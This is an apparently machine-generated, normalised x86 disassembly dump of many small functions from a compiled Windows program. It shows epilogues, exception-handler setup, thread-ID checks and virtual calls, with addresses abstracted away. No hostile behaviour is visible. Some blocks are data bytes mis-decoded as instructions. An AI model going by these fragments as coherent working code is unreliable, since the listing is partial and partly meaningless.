pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45cca2
jmp sub_4039d0
sub_45cca9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45cd2e
jmp sub_4039d0
sub_45cd35
pop ecx
pop ebp
retn
sub_45cd38
mov eax [ eax + 0x4 ]
retn
sub_45cd96
jmp sub_4039d0
sub_45cd9d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45ce79
jmp sub_4039d0
sub_45ce80
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cec1
jmp sub_4039d0
sub_45cec8
pop ebp
retn
sub_45cecc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_45bde4 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_45c9c4
sub_45cf1d
jmp sub_4039d0
sub_45cf24
pop ebp
retn
sub_45cf28
sub [ rw-data ] 0x1
retn
sub_45d0e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c26c
pop esi
pop ebx
retn
sub_45d0f8
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_45d243
jmp sub_4039d0
sub_45d24a
pop ebx
pop ecx
pop ebp
retn
sub_45d319
jmp sub_4039d0
sub_45d320
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d3e8
push ebx
mov ebx eax
call GetCurrentThreadId
cmp eax [ ebx + 0x8 ]
sete al
pop ebx
retn
sub_45d400
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_45d414
call sub_41a658
retn
sub_45d41c
call sub_404654
retn
sub_45d5ef
jmp sub_4039d0
sub_45d5f6
pop ebp
retn
sub_45d6cb
jmp sub_4039d0
sub_45d6d2
pop ecx
pop ebp
retn
sub_45d800
retn
j_sub_45d800
jmp sub_45d800
sub_45d808
pop ebp
retn
sub_45d80c
sub [ rw-data ] 0x1
retn
sub_45da0b
jmp sub_4039d0
sub_45da12
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45daed
jmp sub_4039d0
sub_45daf4
pop ebp
retn
sub_45daf8
sub [ rw-data ] 0x1
retn
sub_45de86
jmp sub_4039d0
sub_45de8d
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45df13
jmp sub_4039d0
sub_45df1a
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035f0
sub_45dfe3
jmp sub_4039d0
sub_45dfea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45e114
jmp sub_4039d0
sub_45e11b
pop ebp
retn
sub_45e120
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45e08c
call sub_403d78
mov dl 0x1
mov eax [ r-xdata ]
call sub_426030
mov [ rw-data ] eax
sub_45e16d
jmp sub_4039d0
sub_45e174
pop ebp
retn
sub_45e178
sub [ rw-data ] 0x1
retn
sub_45e264
retn
sub_45e268
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_45e29c
retn
sub_45e2a0
retn
sub_45e2c9
jmp sub_4039d0
sub_45e2d0
pop ebp
retn
sub_45e2d4
sub [ rw-data ] 0x1
retn
sub_45e7dd
jmp sub_4039d0
sub_45e7e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403848#5
jmp sub_403848
sub_45e8b9
jmp [ ecx + rw-data ]
sub_45e9f3
jmp sub_403848
sub_45eb2f
jmp sub_40371c
j_sub_40371c#3
jmp sub_40371c
sub_45edb1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45edd6
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_404074
retn
sub_45edcf
jmp sub_4039d0
sub_45edd6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ee21
jmp sub_4039d0
sub_45ee28
pop ebp
retn
sub_45ee2c
sub [ rw-data ] 0x1
retn
sub_45f480
jmp sub_4039d0
sub_45f487
pop ebx
mov esp ebp
pop ebp
retn
sub_45f6b0
jmp sub_4039d0
sub_45f6cd
jmp sub_4039d0
sub_45f6d4
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f89d
jmp sub_4039d0
sub_45f8a4
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f8b0
push ebx
mov ebx eax
mov eax ebx
call sub_414d40
mov edx [ r-xdata ]
call sub_403444
mov edx [ ebx + 0x1c ]
mov [ eax + 0x1c ] edx
pop ebx
retn
sub_45f945
jmp sub_4039d0
sub_45f94c
pop ebp
retn
sub_45f950
sub [ rw-data ] 0x1
retn
sub_45fd40
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45fd54
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_45fd64
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_45fd78
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_45fdb1
jmp sub_4039d0
sub_45fdb8
pop ebp
retn
sub_45fdbc
sub [ rw-data ] 0x1
retn
sub_45ffe0
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_404050
pop ebx
retn
sub_4601bd
jmp sub_4039d0
sub_4601c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4602eb
jmp sub_4039d0
sub_4602f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460367
jmp sub_4039d0
sub_46036e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460388
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_460448
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414eb8
pop esi
pop ebx
retn
sub_4604b1
jmp sub_4039d0
sub_4604b8
pop ebp
retn
sub_4604bc
sub [ rw-data ] 0x1
retn
sub_460550
or eax 0xffffffff
retn
sub_460554
push ebx
mov ebx ecx
push 0x0
mov ecx ebx
mov eax [ eax + 0x4 ]
call sub_461974
mov eax ebx
pop ebx
retn
sub_46058d
jmp sub_4039d0
sub_460594
pop ebp
retn
sub_460598
sub [ rw-data ] 0x1
retn
sub_460820
jmp sub_4039d0
sub_460827
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_460881
jmp sub_4039d0
sub_460888
pop ebp
retn
sub_46088c
sub [ rw-data ] 0x1
retn
sub_460ee0
jmp sub_4039d0
sub_460ee7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460f04
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_460efd
jmp sub_4039d0
sub_460f04
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460fd0
jmp sub_4039d0
sub_460fd7
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461188
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_461221
jmp sub_4039d0
sub_461228
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461286
jmp sub_4039d0
sub_46128d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461598
jmp sub_4039d0
sub_46159f
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4617ca
jmp sub_4039d0
sub_4617d1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46185e
jmp sub_4039d0
sub_461865
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4618e4
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41aa14
sub_461af5
jmp sub_4039d0
sub_461b74
jmp sub_4039d0
sub_461b7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_461c49
jmp sub_4039d0
sub_461ca6
jmp sub_4039d0
sub_461cad
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461d34
jmp sub_4039d0
sub_461d3b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461e86
jmp sub_4039d0
sub_461e8d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461eac
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_461ea5
jmp sub_4039d0
sub_461eac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ec9
lea eax [ ebp - 0x14 ]
call sub_404050
retn
sub_461ec2
jmp sub_4039d0
sub_461ec9
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_461f8c
mov eax [ eax + 0xb0 ]
call sub_416d3c
retn
sub_461f98
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_462076
jmp sub_4039d0
sub_46207d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462159
jmp sub_4039d0
sub_462160
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4622b2
jmp sub_4039d0
sub_4622b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4622e3
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_4622dc
jmp sub_4039d0
sub_4622e3
pop ebx
mov esp ebp
pop ebp
retn
sub_462342
jmp sub_4039d0
sub_462349
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4623f6
jmp sub_4039d0
sub_4623fd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462413
inc [ edx ]
add [ eax ] al
add [ esi ] ch
add [ cs : eax ] al
push ebx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_462428
push ebx
mov ebx eax
mov eax ebx
call sub_416d3c
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_462510
jmp sub_4039d0
sub_462517
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462520
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_462618
jmp sub_4039d0
sub_46261f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462681
jmp sub_4039d0
sub_462688
pop ebp
retn
sub_46268c
sub [ rw-data ] 0x1
retn
sub_462848
push ebx
mov ebx eax
mov eax ebx
call sub_45e264
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_4629ad
jmp sub_4039d0
sub_4629b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4629d1
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_4629ca
jmp sub_4039d0
sub_4629d1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_462ba9
jmp sub_4039d0
sub_462bb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_462bbc
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_462c3c
mov eax [ eax + 0x68 ]
call sub_45f59c
retn
sub_462cb8
jmp sub_4039d0
sub_462cbf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462d38
jmp sub_4039d0
sub_462d3f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403848#4
jmp sub_403848
sub_462ef5
jmp sub_4039d0
sub_462efc
pop ebp
retn
sub_462f00
sub [ rw-data ] 0x1
retn
sub_463196
jmp sub_4039d0
sub_46319d
pop ebx
pop ecx
pop ebp
retn
sub_4631a4
retn
sub_4631a8
retn
sub_4631ac
retn
sub_4631b0
retn
sub_46327b
jmp sub_4039d0
sub_463282
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_463298
jmp sub_4039d0
sub_4632c2
jmp sub_4039d0
sub_4632c9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403848#7
jmp sub_403848
j_sub_40371c#5
jmp sub_40371c
sub_463446
jmp sub_4039d0
sub_46344d
pop ecx
pop ebp
retn
sub_4634ae
jmp sub_4039d0
sub_4634b5
pop ecx
pop ebp
retn
sub_46351b
jmp sub_4039d0
sub_463530
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_463544
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_46355c
mov [ eax + 0x49 ] 0x1
call sub_41a898
retn
sub_463568
add eax 0x40
call sub_40d19c
retn
sub_463599
jmp sub_4039d0
sub_4635a0
pop ebp
retn
sub_4635a4
sub [ rw-data ] 0x1
retn
sub_4636b5
jmp sub_4039d0
sub_4636bc
pop ebp
retn
sub_4636c0
sub [ rw-data ] 0x1
retn
sub_46371f
jmp sub_4039d0
sub_463726
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_463776
jmp sub_4039d0
sub_46377d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4637db
jmp sub_4039d0
sub_4637e2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4641f3
jmp [ esi ]
sub_464527
jmp [ eax ]
sub_46485f
jmp [ eax ]
sub_46499c
push edx
push 0x0
push eax
call [ rw-data ]
add esp 0xc
retn
sub_4649ac
push 0x0
push eax
call [ rw-data ]
add esp 0x8
retn
sub_4649bc
cmp [ rw-data ] 0x0
je r-xdata
retn
call [ rw-data ]
sub_4649f8
jmp sub_4039d0
sub_4649ff
pop ebp
retn
sub_464a04
sub [ rw-data ] 0x1
retn
sub_464b65
jmp sub_4039d0
sub_464b6c
pop ebp
retn
sub_464b70
sub [ rw-data ] 0x1
retn
sub_464d35
jmp sub_4039d0
sub_464d3c
pop ebp
retn
sub_464d40
sub [ rw-data ] 0x1
retn
sub_464e1c
jmp sub_4039d0
sub_464e23
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464f5d
jmp sub_4039d0
sub_464f64
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464f91
jmp sub_4039d0
sub_464f98
pop ebp
retn
sub_464f9c
sub [ rw-data ] 0x1
retn
sub_464fe9
jmp sub_4039d0
sub_465021
jmp sub_4039d0
sub_465028
pop ebp
retn
sub_46502c
sub [ rw-data ] 0x1
retn
sub_46527b
jmp sub_4039d0
sub_465282
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4652bc
retn
sub_4652e5
jmp sub_4039d0
sub_4652ec
pop ebp
retn
sub_4652f0
sub [ rw-data ] 0x1
retn
sub_4654e5
jmp [ eax ]
sub_466378
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_466398
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
push edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_4663f4
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_466410
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_466542
jmp sub_4039d0
sub_466586
jmp sub_4039d0
sub_46658d
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4665a4
push ebx
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46664c
jmp sub_4039d0
sub_466653
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466658
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x1c ]
retn
sub_4668d2
jmp sub_4039d0
sub_4668ec
push esi
mov esi eax
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4668fc
mov eax [ eax + 0x70 ]
mov [ eax + 0x1c ] edx
retn
sub_466904
mov ecx edx
mov [ eax + 0x84 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41aa14
sub_466a1c
jmp sub_4039d0
sub_466ac0
jmp sub_4039d0
sub_466b48
jmp sub_4039d0
sub_466b4f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466b8c
retn
sub_466b90
push ebx
mov ebx eax
mov eax ebx
call sub_4631a8
mov dl 0x1
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
j_sub_403848#9
jmp sub_403848
j_sub_40371c
jmp sub_40371c
sub_466e64
mov edx [ eax + 0x68 ]
mov edx [ edx + 0xb8 ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x40 ]
retn
j_sub_403848#3
jmp sub_403848
sub_466f4e
add eax [ eax ]
add [ eax ] al
in al 0x9d
inc ebp
add [ edx + 0x6f ] ch
inc esi
add [ eax - 0x6c ] dl
inc ebp
add [ edi + ebp * 2 - 0x6c13ffba ] bl
inc ebp
add [ ebp - 0x76ffb991 ] dh
retn
sub_466ff2
jmp sub_403848
sub_46703a
jmp sub_4039d0
sub_467041
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467048
push ebx
mov ebx eax
mov eax ebx
call sub_414d40
pop ebx
retn
sub_467098
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414eb8
pop esi
pop ebx
retn
sub_4670ac
push esi
mov si 0xffff
call sub_403490
pop esi
retn
j_sub_403848#2
jmp sub_403848
sub_4673ab
jmp sub_4039d0
sub_4673d5
jmp sub_4039d0
sub_4673dc
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4674af
jmp sub_4039d0
sub_4674b6
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46750c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_4040a4
pop esi
pop ebx
retn
sub_46759d
jmp sub_4039d0
sub_4675a4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4675d4
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_467688
push ebx
mov edx [ eax + 0x4 ]
cmp [ edx + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4676a0
push ebx
sub_4676f5
jmp sub_4039d0
sub_4676fc
pop ebp
retn
sub_467700
sub [ rw-data ] 0x1
retn
sub_46859e
jmp sub_4039d0
sub_4685a5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4685c7
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
sub_4685c0
jmp sub_4039d0
sub_4685c7
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4686ab
jmp sub_4039d0
sub_4686b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4686dc
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_4686d5
jmp sub_4039d0
sub_4686dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468748
mov eax rw-data
call sub_40d19c
mov eax rw-data
call sub_40d19c
mov eax rw-data
call sub_40d19c
call sub_464948
retn
j_sub_40371c#2
jmp sub_40371c
sub_4688cf
jmp sub_4039d0
sub_468b66
jmp sub_4039d0
sub_468b6d
pop ebx
pop ecx
pop ebp
retn
sub_468b74
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_468b90
push ebx
mov cl 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov eax ecx
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov ecx eax
j_sub_403848
jmp sub_403848
sub_468ce8
push ebx
mov ebx eax
lea eax [ ebx + 0x80 ]
call sub_40d19c
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax ebx
call sub_462848
pop ebx
retn
lea eax [ ebx + 0x78 ]
call sub_40d19c
sub_468d10
call sub_462c0c
retn
sub_468d18
push ebx
cmp [ eax + 0xb0 ] 0x0
je r-xdata
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
call sub_462c48
pop ebx
retn
sub_468d30
push ebx
cmp [ eax + 0xb0 ] 0x0
je r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop ebx
retn
call sub_462cc8
pop ebx
retn
sub_468d48
mov eax [ eax + 0x80 ]
call sub_469aec
retn
sub_468d54
mov eax [ eax + 0x80 ]
call sub_469b38
retn
sub_468da7
jmp sub_40371c
sub_468dac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
call sub_403a30
call sub_403a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468ecb
jmp sub_4039d0
sub_468ed2
pop ebx
pop ecx
pop ebp
retn
sub_468ed8
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_468ef4
push ebx
mov cl 0x1
cmp [ eax + 0x9a ] 0x0
je r-xdata
mov eax ecx
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov ecx eax
sub_468f54
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_469004
jmp sub_4039d0
sub_46900b
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4692c8
jmp sub_4039d0
sub_4692cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46953a
jmp sub_4039d0
sub_469541
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469889
jmp sub_4039d0
sub_469890
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469a7e
jmp sub_4039d0
sub_469a85
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469d94
jmp sub_4039d0
sub_469d9b
pop ebp
retn
sub_469da0
sub [ rw-data ] 0x1
retn
sub_469eb1
jmp sub_4039d0
sub_469eb8
pop ebp
retn
sub_469ebc
sub [ rw-data ] 0x1
retn
sub_46a1fa
jmp sub_4039d0
sub_46a201
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46a320
jmp sub_4039d0
sub_46a327
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a3db
jmp sub_4039d0
sub_46a3e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a40c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_46a405
jmp sub_4039d0
sub_46a40c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a4b2
jmp sub_4039d0
sub_46a4b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a4e3
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_46a4dc
jmp sub_4039d0
sub_46a4e3
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46a5b2
jmp sub_4039d0
sub_46a5b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a6f4
jmp sub_4039d0
sub_46a6fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a783
jmp sub_4039d0
sub_46a78a
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a85f
jmp sub_4039d0
sub_46a866
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a895
jmp sub_4039d0
sub_46a89c
pop ebp
retn
sub_46a8a0
sub [ rw-data ] 0x1
retn
sub_46a9a7
jmp sub_4039d0
sub_46a9ae
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46aec7
jmp sub_4039d0
sub_46aece
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b0d4
jmp sub_4039d0
sub_46b0db
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b121
jmp sub_4039d0
sub_46b128
pop ebp
retn
sub_46b12c
sub [ rw-data ] 0x1
retn
sub_46b5bc
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b658
retn
sub_46b674
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b694
retn
sub_46b7df
jmp sub_4039d0
sub_46b7e6
pop ebp
retn
sub_46b7e8
sub [ rw-data ] 0x1
retn
sub_46b974
retn
sub_46b975
jmp sub_4039d0
j_sub_46b974
jmp sub_46b974
sub_46b97c
pop ebp
retn
sub_46b980
sub [ rw-data ] 0x1
retn
sub_46bd43
jmp sub_4039d0
sub_46bd4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bf49
jmp sub_4039d0
sub_46bf50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46bffd
jmp sub_4039d0
sub_46c004
pop ebp
retn
sub_46c008
sub [ rw-data ] 0x1
retn
sub_46c2a1
jmp sub_4039d0
sub_46c2a8
pop ebp
retn
sub_46c2ac
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_46bb84
sub_46c41e
jmp sub_4039d0
sub_46c425
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c4e6
jmp sub_4039d0
sub_46c4ed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c6d3
jmp sub_4039d0
sub_46c6da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c749
jmp sub_4039d0
sub_46c750
pop ebp
retn
sub_46c754
sub [ rw-data ] 0x1
retn
sub_46cace
jmp sub_4039d0
sub_46cad5
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46cba6
jmp sub_4039d0
sub_46cc36
jmp sub_4039d0
sub_46cc3d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46ce98
jmp sub_4039d0
sub_46ce9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cec9
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404074
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_46cec2
jmp sub_4039d0
sub_46cec9
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d136
jmp sub_4039d0
sub_46d13d
